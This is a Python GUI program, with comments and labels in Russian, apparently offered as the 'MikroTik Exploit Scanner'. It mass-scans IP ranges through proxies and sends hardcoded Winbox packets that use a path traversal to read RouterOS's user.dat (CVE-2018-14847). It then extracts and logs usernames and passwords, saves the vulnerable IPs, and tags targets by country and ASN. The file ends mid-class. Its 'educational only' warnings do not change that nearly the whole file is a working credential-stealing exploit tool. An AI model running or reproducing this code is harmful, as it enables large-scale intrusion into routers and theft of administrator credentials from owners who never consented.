#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import socket
import ipcalc
import threading
import time
from datetime import datetime, timedelta
import hashlib
import sys
import os
import urllib.request
import json
from queue import Queue
import requests
import configparser
from collections import defaultdict
import matplotlib.pyplot as plt
from PIL import Image, ImageTk
import pystray
from pystray import MenuItem as item
import socks  # Для поддержки SOCKS прокси

# Исправление рабочей директории для скрипта и исполняемого файла
if getattr(sys, 'frozen', False):
    os.chdir(os.path.dirname(sys.executable))
else:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

class MikroTikScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("MikroTik Exploit Scanner v3.0 Proxy Checker")
        self.root.minsize(700, 600)

        # Основной фрейм с двумя колонками
        self.main_frame = ttk.Frame(self.root)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        self.main_frame.columnconfigure(0, weight=1)
        self.main_frame.columnconfigure(1, weight=1)
        self.main_frame.rowconfigure(0, weight=1)

        # Левая колонка (эксплойт)
        self.exploit_frame = ttk.Frame(self.main_frame)
        self.exploit_frame.grid(row=0, column=0, padx=5, pady=5, sticky="nsew")
        self.exploit_frame.columnconfigure(0, weight=1)
        self.exploit_frame.rowconfigure(8, weight=1)

        # Правая колонка (прокси и изображение)
        self.proxy_frame = ttk.Frame(self.main_frame)
        self.proxy_frame.grid(row=0, column=1, padx=5, pady=5, sticky="nsew")
        self.proxy_frame.columnconfigure(0, weight=1)
        self.proxy_frame.rowconfigure(4, weight=1)  # Изображение займёт оставшееся пространство

        # Очереди для обновления GUI из потоков
        self.log_queue = Queue()
        self.progress_queue = Queue()
        self.proxy_progress_queue = Queue()

        # Системный трей
        self.icon = None
        self.setup_system_tray()

        # Менеджер конфигурации
        self.config = configparser.ConfigParser()
        self.config_file = "config.ini"
        if not os.path.exists(self.config_file):
            self.create_default_config()
        self.load_config()

        # Установка размеров и положения окна
        self.load_window_geometry()

        # Переменные
        self.input_mode = tk.StringVar(value="ip")
        self.ip_var = tk.StringVar(value=self.config.get('Settings', 'last_ip', fallback=""))
        self.port_var = tk.StringVar(value=self.config.get('Settings', 'port', fallback="8291"))
        self.file_var = tk.StringVar(value=self.config.get('Settings', 'last_file', fallback="Файл не выбран"))
        self.proxy_type = tk.StringVar(value=self.config.get('Settings', 'proxy_type', fallback="socks5"))
        self.proxy_var = tk.StringVar(value=self.config.get('Settings', 'proxy', fallback=""))
        self.proxy_user = tk.StringVar(value=self.config.get('Settings', 'proxy_user', fallback=""))
        self.proxy_pass = tk.StringVar(value=self.config.get('Settings', 'proxy_pass', fallback=""))
        self.scan_threads = tk.IntVar(value=int(self.config.get('Settings', 'scan_threads', fallback=10)))
        self.proxy_threads = tk.IntVar(value=int(self.config.get('Settings', 'proxy_threads', fallback=10)))
        self.stats_time_format = tk.StringVar(value="day")  # Формат времени для статистики

        # Переменные состояния
        self.stop_scan = False
        self.pause_scan = False
        self.proxy_test_running = False
        self.proxy_test_paused = False
        self.scan_queue = Queue()
        self.proxy_queue = Queue()
        self.successful_ips = []
        self.geo_data = defaultdict(list)
        self.router_versions = defaultdict(int)
        self.valid_proxy_count = 0
        self.start_time = None
        self.scanned_count = 0
        self.total_count = 0
        self.countries = ["Все"]
        self.asns = ["Все"]

        # Списки для статистики с временными метками
        self.vulnerable_timestamps = []  # Уязвимые устройства
        self.non_vulnerable_timestamps = []  # Неуязвимые устройства
        self.valid_proxy_timestamps = []  # Валидные прокси
        self.invalid_proxy_timestamps = []  # Невалидные прокси

        # Настройка интерфейса
        self.setup_ui()
        self.setup_hotkeys()

        # Запуск периодической проверки очередей для обновления GUI
        self.check_queues()

    def load_window_geometry(self):
        # Проверяем, есть ли сохранённые параметры в config.ini
        if (self.config.has_option('Settings', 'window_width') and 
            self.config.has_option('Settings', 'window_height') and
            self.config.has_option('Settings', 'window_x') and
            self.config.has_option('Settings', 'window_y')):
            # Загружаем сохранённые размеры и положение
            width = self.config.get('Settings', 'window_width', fallback="800")
            height = self.config.get('Settings', 'window_height', fallback="600")
            x = self.config.get('Settings', 'window_x', fallback="0")
            y = self.config.get('Settings', 'window_y', fallback="0")
            self.root.geometry(f"{width}x{height}+{x}+{y}")
        else:
            # При первом запуске максимизируем окно
            self.root.state('zoomed')

    def save_window_geometry(self):
        # Сохраняем текущие размеры и положение окна, если оно не максимизировано
        if self.root.state() != 'zoomed':
            self.config['Settings']['window_width'] = str(self.root.winfo_width())
            self.config['Settings']['window_height'] = str(self.root.winfo_height())
            self.config['Settings']['window_x'] = str(self.root.winfo_x())
            self.config['Settings']['window_y'] = str(self.root.winfo_y())
        else:
            # Если окно максимизировано, можно сохранить значения по умолчанию
            self.config['Settings']['window_width'] = "800"
            self.config['Settings']['window_height'] = "600"
            self.config['Settings']['window_x'] = "0"
            self.config['Settings']['window_y'] = "0"
        with open(self.config_file, 'w') as f:
            self.config.write(f)

    def setup_system_tray(self):
        try:
            # Определяем путь к icon.png
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))

            icon_path = os.path.join(base_path, "icon.png")
            image = Image.open(icon_path)
            menu = (
                item("Показать", self.show_window),
                item("Выход", self.quit_application)
            )
            self.icon = pystray.Icon("MikroTik Scanner", image, "MikroTik Exploit Scanner v3.0 Proxy Checker", menu)
            threading.Thread(target=self.icon.run, daemon=True).start()
        except Exception as e:
            self.log_queue.put((f"Ошибка настройки системного трея: {str(e)}", "error"))

    def show_window(self):
        self.root.deiconify()
        if self.icon:
            self.icon.stop()

    def quit_application(self):
        self.stop_scan = True
        self.proxy_test_cancel = True
        if self.icon:
            self.icon.stop()
        # Сохраняем геометрию окна перед закрытием
        self.save_window_geometry()
        self.root.quit()  # Завершаем цикл mainloop
        self.root.destroy()  # Уничтожаем окно

    def create_default_config(self):
        self.config['Settings'] = {
            'last_ip': '',
            'port': '8291',
            'last_file': '',
            'proxy_type': 'socks5',
            'proxy': '',
            'proxy_user': '',
            'proxy_pass': '',
            'scan_threads': '10',
            'proxy_threads': '10'
        }
        with open(self.config_file, 'w') as f:
            self.config.write(f)

    def load_config(self):
        self.config.read(self.config_file)

    def save_config(self):
        self.config['Settings'] = {
            'last_ip': self.ip_var.get(),
            'port': self.port_var.get(),
            'last_file': self.file_var.get(),
            'proxy_type': self.proxy_type.get(),
            'proxy': self.proxy_var.get(),
            'proxy_user': self.proxy_user.get(),
            'proxy_pass': self.proxy_pass.get(),
            'scan_threads': str(self.scan_threads.get()),
            'proxy_threads': str(self.proxy_threads.get()),
            'window_width': self.config.get('Settings', 'window_width', fallback='800'),
            'window_height': self.config.get('Settings', 'window_height', fallback='600'),
            'window_x': self.config.get('Settings', 'window_x', fallback='0'),
            'window_y': self.config.get('Settings', 'window_y', fallback='0')
        }
        with open(self.config_file, 'w') as f:
            self.config.write(f)

    def setup_ui(self):
        # --- Левая колонка (Эксплойт) ---
        # Выбор режима ввода
        input_frame = ttk.LabelFrame(self.exploit_frame, text="Режим ввода", padding=10)
        input_frame.grid(row=0, column=0, columnspan=2, padx=10, pady=5, sticky="we")

        ttk.Radiobutton(input_frame, text="IP/CIDR", value="ip", variable=self.input_mode,
                       command=self.toggle_input_mode).grid(row=0, column=0, padx=5)
        ttk.Radiobutton(input_frame, text="Файл", value="file", variable=self.input_mode,
                       command=self.toggle_input_mode).grid(row=0, column=1, padx=5)

        # Ввод IP
        self.ip_frame = ttk.Frame(self.exploit_frame)
        self.ip_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=5, sticky="we")
        ttk.Label(self.ip_frame, text="IP или CIDR:").grid(row=0, column=0, sticky="w")
        self.ip_entry = ttk.Entry(self.ip_frame, textvariable=self.ip_var, width=30)
        self.ip_entry.grid(row=0, column=1, sticky="ew")
        self.setup_entry_context_menu(self.ip_entry)  # Добавляем контекстное меню

        # Ввод файла
        self.file_frame = ttk.Frame(self.exploit_frame)
        self.file_frame.grid(row=2, column=0, columnspan=2, padx=10, pady=5, sticky="we")
        ttk.Label(self.file_frame, text="Файл со списком IP:").grid(row=0, column=0, sticky="w")
        self.file_button = ttk.Button(self.file_frame, text="Обзор", command=self.browse_file)
        self.file_button.grid(row=0, column=1, sticky="w")
        self.file_label = ttk.Label(self.file_frame, textvariable=self.file_var, wraplength=300)
        self.file_label.grid(row=1, column=0, columnspan=2, sticky="w")

        # Порт
        ttk.Label(self.exploit_frame, text="Порт:").grid(row=3, column=0, padx=10, pady=5, sticky="w")
        ttk.Entry(self.exploit_frame, textvariable=self.port_var, width=10).grid(row=3, column=1, padx=10, pady=5, sticky="w")

        # Потоки сканирования
        threads_frame = ttk.Frame(self.exploit_frame)
        threads_frame.grid(row=4, column=0, columnspan=2, padx=10, pady=5, sticky="w")
        ttk.Label(threads_frame, text="Потоки сканирования:").grid(row=0, column=0, sticky="w")
        ttk.Entry(threads_frame, textvariable=self.scan_threads, width=5).grid(row=0, column=1, sticky="w")

        # Фильтры
        filter_frame = ttk.LabelFrame(self.exploit_frame, text="Фильтры результатов", padding=10)
        filter_frame.grid(row=5, column=0, columnspan=2, padx=10, pady=5, sticky="we")
        ttk.Label(filter_frame, text="Страна:").grid(row=0, column=0, sticky="w")
        self.country_filter = ttk.Combobox(filter_frame, values=self.countries, width=15, state="readonly")
        self.country_filter.grid(row=0, column=1, sticky="w")
        self.country_filter.set("Все")
        ttk.Label(filter_frame, text="ASN:").grid(row=0, column=2, sticky="w")
        self.asn_filter = ttk.Combobox(filter_frame, values=self.asns, width=15, state="readonly")
        self.asn_filter.grid(row=0, column=3, sticky="w")
        self.asn_filter.set("Все")
        ttk.Button(filter_frame, text="Применить фильтры", command=self.apply_filters).grid(row=0, column=4, padx=5)

        # Кнопки эксплойта
        button_frame = ttk.Frame(self.exploit_frame)
        button_frame.grid(row=6, column=0, columnspan=2, pady=5)
        self.start_btn = ttk.Button(button_frame, text="Старт", command=self.start_scan)
        self.start_btn.pack(side=tk.LEFT, padx=2)
        self.pause_btn = ttk.Button(button_frame, text="Пауза", command=self.toggle_pause_scan, state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=2)
        self.stop_btn = ttk.Button(button_frame, text="Стоп", command=self.stop_scanner, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=2)
        self.clear_btn = ttk.Button(button_frame, text="Очистить", command=self.clear_output)
        self.clear_btn.pack(side=tk.LEFT, padx=2)
        self.about_btn = ttk.Button(button_frame, text="О программе", command=self.show_about)
        self.about_btn.pack(side=tk.LEFT, padx=2)
        ttk.Button(button_frame, text="Показать статистику", command=self.show_stats).pack(side=tk.LEFT, padx=2)

        # Статус и прогресс сканирования
        status_frame = ttk.Frame(self.exploit_frame)
        status_frame.grid(row=7, column=0, columnspan=2, sticky="we", padx=10, pady=5)
        self.status_label = ttk.Label(status_frame, text="Готов", relief=tk.SUNKEN)
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.progress_var = tk.DoubleVar()
        self.progress = ttk.Progressbar(status_frame, variable=self.progress_var, maximum=100, mode='determinate')
        self.progress.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.progress_text = ttk.Label(status_frame, text="0%", width=5)
        self.progress_text.pack(side=tk.LEFT)

        # --- Правая колонка (Прокси) ---
        # Настройки прокси
        proxy_frame = ttk.LabelFrame(self.proxy_frame, text="Настройки прокси", padding=10)
        proxy_frame.grid(row=0, column=0, padx=10, pady=5, sticky="we")

        ttk.Label(proxy_frame, text="Тип прокси:").grid(row=0, column=0, sticky="w")
        ttk.OptionMenu(proxy_frame, self.proxy_type, "socks5", "http", "socks4", "socks5", "all",
                      command=self.update_proxy_fields).grid(row=0, column=1, sticky="w")

        ttk.Label(proxy_frame, text="Прокси (ip:port):").grid(row=1, column=0, sticky="w")
        self.proxy_entry = ttk.Entry(proxy_frame, textvariable=self.proxy_var, width=20)
        self.proxy_entry.grid(row=1, column=1, sticky="w")
        self.setup_entry_context_menu(self.proxy_entry)  # Добавляем контекстное меню

        ttk.Label(proxy_frame, text="Логин:").grid(row=2, column=0, sticky="w")
        self.proxy_user_entry = ttk.Entry(proxy_frame, textvariable=self.proxy_user)
        self.proxy_user_entry.grid(row=2, column=1, sticky="w")
        self.setup_entry_context_menu(self.proxy_user_entry)  # Добавляем контекстное меню

        ttk.Label(proxy_frame, text="Пароль:").grid(row=2, column=2, sticky="w")
        self.proxy_pass_entry = ttk.Entry(proxy_frame, textvariable=self.proxy_pass)
        self.proxy_pass_entry.grid(row=2, column=3, sticky="w")
        self.setup_entry_context_menu(self.proxy_pass_entry)  # Добавляем контекстное меню

        # Потоки проверки прокси
        proxy_threads_frame = ttk.Frame(self.proxy_frame)
        proxy_threads_frame.grid(row=1, column=0, padx=10, pady=5, sticky="we")
        ttk.Label(proxy_threads_frame, text="Потоки проверки прокси:").grid(row=0, column=0, sticky="w")
        ttk.Entry(proxy_threads_frame, textvariable=self.proxy_threads, width=5).grid(row=0, column=1, sticky="w")

        # Кнопки прокси
        proxy_button_frame = ttk.Frame(self.proxy_frame)
        proxy_button_frame.grid(row=2, column=0, pady=5, sticky="we")
        self.test_proxy_btn = ttk.Button(proxy_button_frame, text="Тест прокси", command=self.test_current_proxy)
        self.test_proxy_btn.pack(side=tk.LEFT, padx=2)
        self.test_proxy_list_btn = ttk.Button(proxy_button_frame, text="Тест списка прокси", command=self.test_proxy_list)
        self.test_proxy_list_btn.pack(side=tk.LEFT, padx=2)
        self.pause_proxy_test_btn = ttk.Button(proxy_button_frame, text="Пауза теста прокси", command=self.toggle_pause_proxy_test, state=tk.DISABLED)
        self.pause_proxy_test_btn.pack(side=tk.LEFT, padx=2)
        self.cancel_proxy_test_btn = ttk.Button(proxy_button_frame, text="Отмена теста прокси", command=self.cancel_proxy_test, state=tk.DISABLED)
        self.cancel_proxy_test_btn.pack(side=tk.LEFT, padx=2)

        # Статус и прогресс проверки прокси
        proxy_status_frame = ttk.Frame(self.proxy_frame)
        proxy_status_frame.grid(row=3, column=0, sticky="we", padx=10, pady=5)
        self.proxy_status_label = ttk.Label(proxy_status_frame, text="Готов", relief=tk.SUNKEN)
        self.proxy_status_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.proxy_progress_var = tk.DoubleVar()
        self.proxy_progress = ttk.Progressbar(proxy_status_frame, variable=self.proxy_progress_var, maximum=100, mode='determinate')
        self.proxy_progress.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.proxy_progress_text = ttk.Label(proxy_status_frame, text="0%", width=5)
        self.proxy_progress_text.pack(side=tk.LEFT)

        # Изображение fon.png
        try:
            # Определяем путь к fon.png
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(os.path.abspath(__file__))

            fon_path = os.path.join(base_path, "fon.png")
            self.fon_image = Image.open(fon_path)
            self.fon_photo = ImageTk.PhotoImage(self.fon_image)
            self.fon_label = ttk.Label(self.proxy_frame, image=self.fon_photo)
            self.fon_label.grid(row=4, column=0, padx=10, pady=5, sticky="nsew")
            self.proxy_frame.bind("<Configure>", self.resize_image)
        except Exception as e:
            self.log_queue.put((f"Ошибка загрузки изображения fon.png: {str(e)}", "error"))
            # Создаём заглушку вместо изображения
            self.fon_label = ttk.Label(self.proxy_frame, text="Не удалось загрузить изображение")
            self.fon_label.grid(row=4, column=0, padx=10, pady=5, sticky="nsew")

        # --- Нижняя часть (Вывод и предупреждение) ---
        output_frame = ttk.Frame(self.main_frame)
        output_frame.grid(row=1, column=0, columnspan=2, padx=10, pady=5, sticky="nsew")
        output_frame.columnconfigure(0, weight=1)
        output_frame.rowconfigure(0, weight=1)

        # Вывод
        self.output_text = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, height=15, font=('Consolas', 10), undo=True)
        self.output_text.grid(row=0, column=0, padx=10, pady=5, sticky="nsew")
        self.output_text.tag_config("error", foreground="red")
        self.output_text.tag_config("success", foreground="green")
        self.output_text.tag_config("info", foreground="blue")
        self.output_text.tag_config("warning", foreground="orange")

        # Предупреждение
        warning_label = ttk.Label(output_frame, text="Запрещено использование без согласия владельца оборудования!",
                                 foreground="red", font=('Arial', 12, 'bold'))
        warning_label.grid(row=1, column=0, padx=10, pady=5, sticky="w")

        # Разрешаем копирование текста
        self.output_text.bind("<Control-c>", self.copy_text)
        self.setup_context_menu()

        self.toggle_input_mode()

    def resize_image(self, event):
        # Масштабирование изображения с учётом размеров proxy_frame
        if hasattr(self, 'fon_image'):
            # Получаем размеры proxy_frame
            new_width = self.proxy_frame.winfo_width() - 20  # Учитываем padding
            new_height = self.proxy_frame.winfo_height() - self.proxy_frame.winfo_children()[0].winfo_height() - self.proxy_frame.winfo_children()[1].winfo_height() - self.proxy_frame.winfo_children()[2].winfo_height() - self.proxy_frame.winfo_children()[3].winfo_height() - 40  # Вычитаем высоту других виджетов
            if new_width > 0 and new_height > 0:
                # Сохраняем пропорции изображения
                orig_width, orig_height = self.fon_image.size
                ratio = min(new_width / orig_width, new_height / orig_height)
                resized_width = int(orig_width * ratio)
                resized_height = int(orig_height * ratio)
                resized_image = self.fon_image.resize((resized_width, resized_height), Image.Resampling.LANCZOS)
                self.fon_photo = ImageTk.PhotoImage(resized_image)
                self.fon_label.configure(image=self.fon_photo)

    def setup_hotkeys(self):
        self.root.bind('<Control-s>', lambda e: self.start_scan())
        self.root.bind('<Control-p>', lambda e: self.toggle_pause_scan())
        self.root.bind('<Control-t>', lambda e: self.test_current_proxy())
        self.root.bind('<Control-c>', lambda e: self.copy_text())
        self.root.bind('<Control-v>', lambda e: self.paste_text())  # Добавляем привязку для Ctrl+V
        self.root.bind('<Control-q>', lambda e: self.quit_application())

    def setup_context_menu(self):
        self.context_menu = tk.Menu(self.output_text, tearoff=0)
        self.context_menu.add_command(label="Копировать", command=self.copy_text)
        self.output_text.bind("<Button-3>", self.show_context_menu)

    def setup_entry_context_menu(self, entry):
        context_menu = tk.Menu(entry, tearoff=0)
        context_menu.add_command(label="Вставить", command=lambda: self.paste_text())
        entry.bind("<Button-3>", lambda event: context_menu.post(event.x_root, event.y_root))

    def show_context_menu(self, event):
        self.context_menu.post(event.x_root, event.y_root)

    def copy_text(self, event=None):
        try:
            selected_text = self.output_text.selection_get()
            self.root.clipboard_clear()
            self.root.clipboard_append(selected_text)
            self.log_queue.put(("Текст скопирован в буфер обмена", "info"))
        except tk.TclError:
            self.log_queue.put(("Ошибка: Ничего не выделено для копирования", "warning"))
        return "break"

    def paste_text(self, event=None):
        try:
            widget = self.root.focus_get()  # Получаем виджет, который в фокусе
            if isinstance(widget, (tk.Entry, ttk.Entry)):  # Проверяем, что это поле ввода
                widget.delete(0, tk.END)  # Очищаем текущее содержимое
                widget.insert(0, self.root.clipboard_get())  # Вставляем текст из буфера
                self.log_queue.put(("Текст вставлен из буфера обмена", "info"))
            else:
                self.log_queue.put(("Ошибка: Фокус не на поле ввода", "warning"))
        except tk.TclError:
            self.log_queue.put(("Ошибка: Буфер обмена пуст", "warning"))
        return "break"

    def toggle_input_mode(self):
        mode = self.input_mode.get()
        self.ip_entry.config(state='normal' if mode == "ip" else 'disabled')
        self.file_button.config(state='normal' if mode == "file" else 'disabled')

    def update_proxy_fields(self, *args):
        proxy_type = self.proxy_type.get()
        state = 'normal'
        self.proxy_entry.config(state=state)
        self.proxy_user_entry.config(state=state)
        self.proxy_pass_entry.config(state=state)

    def show_about(self):
        about_text = """
        MikroTik Exploit Scanner v3.0 Proxy Checker
        
        Программа для тестирования уязвимости MikroTik RouterOS через протокол Winbox (CVE-2018-14847).
        
        Возможности:
        - Расширенная поддержка прокси (SOCKS4/5, HTTP)
        - Определение геолокации и ASN
        - Определение версии RouterOS
        - Интеграция с системным треем
        
        Только для образовательных целей и тестирования собственных сетей!
        """
        self.log_queue.put((about_text, "info"))

    def format_time(self, td):
        total_seconds = int(td.total_seconds())
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        seconds = total_seconds % 60
        return f"{hours:02}:{minutes:02}:{seconds:02}"

    def update_progress(self, value, text=None):
        self.progress_queue.put((value, text))

    def update_proxy_progress(self, value, text=None):
        self.proxy_progress_queue.put((value, text))

    def log_message(self, message, tag=None):
        self.output_text.insert(tk.END, message + "\n", tag)
        self.output_text.see(tk.END)
        self.output_text.update_idletasks()

    def check_queues(self):
        # Проверяем очередь логов
        while not self.log_queue.empty():
            message, tag = self.log_queue.get_nowait()
            self.log_message(message, tag)

        # Проверяем очередь прогресса сканирования
        while not self.progress_queue.empty():
            value, text = self.progress_queue.get_nowait()
            self.progress_var.set(value)
            self.progress_text.config(text=f"{int(value)}%")
            if text:
                self.status_label.config(text=text)
            self.root.update_idletasks()

        # Проверяем очередь прогресса проверки прокси
        while not self.proxy_progress_queue.empty():
            value, text = self.proxy_progress_queue.get_nowait()
            self.proxy_progress_var.set(value)
            self.proxy_progress_text.config(text=f"{int(value)}%")
            if text:
                self.proxy_status_label.config(text=text)
            self.root.update_idletasks()

        # Планируем следующую проверку
        self.root.after(100, self.check_queues)

    def get_full_path(self, filename):
        return os.path.join(os.getcwd(), filename)

    def browse_file(self):
        filename = filedialog.askopenfilename(
            title="Выберите файл со списком IP",
            initialdir=os.getcwd()
        )
        if filename:
            self.file_var.set(filename)
            self.save_config()

    def create_socket(self, timeout=5, proxy_info=None):
        if proxy_info:
            proxy_type = proxy_info['type']
            proxy_host, proxy_port = proxy_info['host'].split(":")
            proxy_user = proxy_info['user']
            proxy_pass = proxy_info['pass']

            if proxy_type == "http":
                s = socket.socket()
            else:
                if proxy_type == "socks4":
                    s = socks.socksocket()
                    s.set_proxy(socks.SOCKS4, proxy_host, int(proxy_port), username=proxy_user, password=proxy_pass)
                elif proxy_type == "socks5":
                    s = socks.socksocket()
                    s.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port), username=proxy_user, password=proxy_pass)
                else:
                    s = socket.socket()
        else:
            s = socket.socket()

        s.settimeout(timeout)
        return s

    def get_geo_info(self, ip):
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Неизвестно'),
                    'asn': data.get('as', 'Неизвестно'),
                    'org': data.get('org', 'Неизвестно')
                }
        except:
            pass
        return {'country': 'Неизвестно', 'asn': 'Неизвестно', 'org': 'Неизвестно'}

    def detect_router_version(self, data):
        try:
            version_str = data.decode('utf-8', errors='ignore')
            if 'RouterOS' in version_str:
                import re
                version = re.search(r'RouterOS\s+([\d.]+)', version_str)
                return version.group(1) if version else 'Неизвестно'
        except:
            pass
        return 'Неизвестно'

    def start_scan(self):
        self.stop_scan = False
        self.pause_scan = False
        self.successful_ips = []
        self.geo_data.clear()
        self.router_versions.clear()
        self.vulnerable_timestamps.clear()
        self.non_vulnerable_timestamps.clear()
        ip = self.ip_var.get()
        port = self.port_var.get()
        file = self.file_var.get()

        if self.input_mode.get() == "ip" and not ip:
            self.log_queue.put(("Ошибка: Введите IP/CIDR!", "error"))
            return
        if self.input_mode.get() == "file" and file == "Файл не выбран":
            self.log_queue.put(("Ошибка: Выберите файл со списком IP!", "error"))
            return

        self.save_config()
        self.start_btn.config(state=tk.DISABLED)
        self.pause_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.NORMAL)
        self.update_progress(0, "Подготовка к сканированию...")
        self.start_time = datetime.now()
        self.scanned_count = 0

        threading.Thread(target=self.scan_worker, daemon=True).start()

    def scan_worker(self):
        try:
            targets = []
            if self.input_mode.get() == "file":
                with open(self.file_var.get(), "r") as f:
                    targets = [line.strip() for line in f if line.strip()]
            else:
                ip = self.ip_var.get()
                targets = [str(ip) for ip in ipcalc.Network(ip)] if "/" in ip else [ip]

            self.total_count = len(targets)
            for target in targets:
                self.scan_queue.put(target)

            threads = []
            for _ in range(min(self.scan_threads.get(), self.total_count)):
                t = threading.Thread(target=self.scan_ip_worker, args=(self.port_var.get(),), daemon=True)
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

            if not self.stop_scan:
                self.finalize_scan()

        except Exception as e:
            self.log_queue.put((f"Критическая ошибка: {str(e)}", "error"))
            self.update_progress(0, "Ошибка сканирования")
        finally:
            self.start_btn.config(state=tk.NORMAL)
            self.pause_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.DISABLED)

    def scan_ip_worker(self, port):
        hello = bytearray([
            0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
            0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
            0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
            0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
            0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
            0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
            0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
            0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
            0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
            0x00, 0x00
        ])

        getData = bytearray([
            0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
            0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
            0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
            0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
            0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
            0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x02, 0x00, 0x00, 0x00
        ])

        while not self.scan_queue.empty() and not self.stop_scan:
            if self.pause_scan:
                time.sleep(0.1)
                continue

            try:
                ip_str = self.scan_queue.get_nowait()
            except:
                break

            try:
                self.scanned_count += 1
                geo_info = self.get_geo_info(ip_str)
                self.geo_data[ip_str] = geo_info

                proxy_info = {
                    'type': self.proxy_type.get(),
                    'host': self.proxy_var.get(),
                    'user': self.proxy_user.get(),
                    'pass': self.proxy_pass.get()
                }
                theSocket = self.create_socket(proxy_info=proxy_info if self.proxy_var.get() else None)

                if self.proxy_type.get() == "http" and self.proxy_var.get():
                    proxy_host, proxy_port = self.proxy_var.get().split(":")
                    theSocket.connect((proxy_host, int(proxy_port)))
                    theSocket.send(f"CONNECT {ip_str}:{port} HTTP/1.1\r\n\r\n".encode())
                    response = theSocket.recv(1024)
                    if not response.startswith(b"HTTP/1.1 200"):
                        raise ConnectionError("Ошибка подключения через HTTP прокси")
                else:
                    theSocket.connect((ip_str, int(port)))

                theSocket.send(hello)
                result = bytearray(theSocket.recv(1024))
                
                if len(result) < 56:
                    raise ValueError("Недостаточно данных в ответе")

                getData[19] = result[38]
                theSocket.send(getData)
                result = bytearray(theSocket.recv(1024))

                if len(result) < 56:
                    raise ValueError("Недостаточно данных для анализа")

                version = self.detect_router_version(result)
                self.router_versions[version] += 1

                user_pass = self.get_pair(result[55:])
                current_time = datetime.now()
                if user_pass:
                    self.log_queue.put((f"\n=== Успех: {ip_str} ===", "success"))
                    self.log_queue.put((f"Версия: {version}", "success"))
                    self.log_queue.put((f"Страна: {geo_info['country']}", "success"))
                    self.log_queue.put((f"ASN: {geo_info['asn']}", "success"))
                    self.log_queue.put((f"Организация: {geo_info['org']}", "success"))
                    for u, p in user_pass:
                        self.log_queue.put((f"Пользователь: {u}\nПароль: {p}", "success"))
                    self.save_successful_result(ip_str, result[55:], geo_info, version)
                    self.successful_ips.append(ip_str)
                    self.vulnerable_timestamps.append(current_time)
                else:
                    self.non_vulnerable_timestamps.append(current_time)

                self.update_progress(
                    (self.scanned_count / self.total_count) * 100,
                    f"Сканирование {self.scanned_count}/{self.total_count}: {ip_str}"
                )

            except Exception as e:
                self.log_queue.put((f"{ip_str}: Ошибка: {str(e)}", "error"))
                self.non_vulnerable_timestamps.append(datetime.now())
            finally:
                try:
                    theSocket.close()
                except:
                    pass
                self.scan_queue.task_done()

    def finalize_scan(self):
        elapsed = self.format_time(datetime.now() - self.start_time)
        self.update_progress(100, f"Сканирование завершено | Время: {elapsed}")
        self.log_queue.put((f"\n=== Сканирование завершено ===", "info"))
        self.log_queue.put((f"Время выполнения: {elapsed}", "info"))
        self.log_queue.put((f"Найдено устройств: {len(self.successful_ips)}", "info"))

        # Обновляем списки стран и ASN для фильтров
        countries = set()
        asns = set()
        for ip in self.geo_data:
            geo = self.geo_data[ip]
            countries.add(geo['country'])
            asns.add(geo['asn'])
        self.countries = ["Все"] + sorted(countries)
        self.asns = ["Все"] + sorted(asns)
        self.country_filter['values'] = self.countries
        self.asn_filter['values'] = self.asns

        if self.successful_ips:
            with open(self.get_full_path("success_ips.txt"), "w", encoding='utf-8') as f:
                f.write("\n".join(self.successful_ips))

    def toggle_pause_scan(self):
        self.pause_scan = not self.pause_scan
        self.pause_btn.config(text="Продолжить" if self.pause_scan else "Пауза")
        status = "Сканирование приостановлено" if self.pause_scan else "Сканирование возобновлено"
        self.update_progress(self.progress_var.get(), status)
        self.log_queue.put((f"=== {status.upper()} ===", "info"))

    def stop_scanner(self):
        self.stop_scan = True
        self.pause_scan = False
